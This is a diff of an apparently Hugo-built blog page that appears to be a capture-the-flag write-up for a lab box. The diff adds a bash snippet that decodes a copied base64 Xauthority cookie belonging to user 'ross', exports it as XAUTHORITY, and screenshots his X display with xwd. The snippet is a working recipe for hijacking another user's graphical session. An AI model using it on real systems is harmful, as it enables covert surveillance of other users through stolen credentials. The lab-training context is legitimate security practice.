@@ -293,7 +293,7 @@
 
 
                 <time class="article-time--reading">
-                    3 minute read
+                    4 minute read
                 </time>
             </div>
         
@@ -487,7 +487,19 @@
 	
 	
 ></p>
-<p>Exported the ross&rsquo;s Xauthority cookie and tried to take screenshot. (Had some trouble with the xwd syntax)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> COPIED_BASE64_STRING <span class="p">|</span> base64 -d &gt; copied_cred
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">XAUTHORITY</span><span class="o">=</span>/home/alex/copied_cred
+</span></span><span class="line"><span class="cl">xwd -root -display :0 -out screenshot.xwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Exported the ross&rsquo;s Xauthority cookie and tried to take screenshot. (Had some trouble with the xwd syntax)</p>
 <p>Once the screenshot is taken, let&rsquo;s transport it back to our local machine and see the picture.
 <img src="https://raw.githubusercontent.com/sudo-echo-jin/blog/main/squashed/b11.png"
 	
